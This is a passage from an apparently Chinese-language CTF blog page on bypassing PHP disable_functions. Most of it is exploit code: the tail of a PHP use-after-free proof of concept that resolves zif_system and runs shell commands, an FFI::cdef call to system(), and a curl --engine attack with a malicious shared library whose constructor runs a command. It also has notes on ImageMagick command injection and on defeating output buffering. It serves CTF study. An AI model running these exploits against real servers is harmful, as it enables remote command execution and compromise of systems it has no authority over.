            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>

            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>

            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>
        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

        <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>
    <span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>

    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h4 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h4><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a></p>
<p>PHP&gt;&#x3D;7.4</p>
<p>外部函数接口，允许从用户在PHP代码中去调用C代码</p>
<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">public static FFI::cdef(string $code &#x3D; &quot;&quot;, ?string $lib &#x3D; null): FFI
    
其中$code为一个字符串，包含常规C语言中的一系列声明，
$lib为要加载和链接的共享库文件名称，
如果省略lib，则平台将会尝试在全局范围内查找代码中声明的符号，其他系统将无法解析这些符号。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个system对象</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'/readflag > 1.txt'</span><span class="token punctuation">;</span><span class="token comment">//没有回显的,需要访问1.txt</span>
<span class="token variable">$ffi</span><span class="token operator">-></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过$ffi去调用system函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<hr>
<h4 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h4><p>条件：</p>
<ul>
<li><p>目标主机安装了漏洞版本的imagemagick（&lt;&#x3D; 3.3.0）</p>
</li>
<li><p>安装了 php-imagick 拓展并在php.ini中启用</p>
</li>
<li><p>编写php通过 new Imagick 对象的方式来处理图片等格式文件</p>
</li>
<li><p>PHP &gt;&#x3D; 5.4</p>
</li>
</ul>
<p>过程：只要将精心构造的图片上传至使用漏洞版本的ImageMagick，ImageMagick会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令</p>
<hr>
<h4 id="cnext-CVE-2024-2961"><a href="#cnext-CVE-2024-2961" class="headerlink" title="cnext (CVE-2024-2961)"></a>cnext (CVE-2024-2961)</h4><p><a href="/blog/2024/05/31/CVE-2024-2961%E5%A4%8D%E7%8E%B0/">链接</a></p>
<p>因为本质是 pwn RCE 的方式，所以可以直接绕过 disable_functions</p>
<hr>
<h4 id="curl-–engine-RCE"><a href="#curl-–engine-RCE" class="headerlink" title="curl –engine RCE"></a>curl –engine RCE</h4><p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/3293801">https://hackerone.com/reports/3293801</a></p>
<p>类似 LD_PRELOAD，准备一个恶意 so</p>
<p>evil_engine.c</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token comment">// This constructor function is executed automatically by the dynamic loader</span>
<span class="token comment">// as soon as the library is loaded into the process address space.</span>
<span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">rce_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"id > /tmp/RCE_VIA_ENGINE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>编译</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-shared</span> <span class="token parameter variable">-o</span> evil_engine.so evil_engine.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>poc：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">--engine</span> <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span>/evil_engine.so https://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>php中的利用：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"http://example.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSLENGINE</span> <span class="token punctuation">,</span> <span class="token string double-quoted-string">"/tmp/2.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h2 id="缓冲区关闭"><a href="#缓冲区关闭" class="headerlink" title="缓冲区关闭"></a>缓冲区关闭</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi/article/details/121723791">https://blog.csdn.net/Kracxi/article/details/121723791</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 打开缓冲区，开始输出缓冲, 这时PHP停止输出, 在这以后的输出都被转到一个内部的缓冲里</span>
<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 清空（擦除）缓冲区并关闭输出缓冲</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>一旦缓冲区被 ob_end_clean 清除，我们就无法得知命令执行结果</p>
<p>绕过方法：</p>
<p>执行完我们传入的代码然后直接结束程序不执行后面的代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2026 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>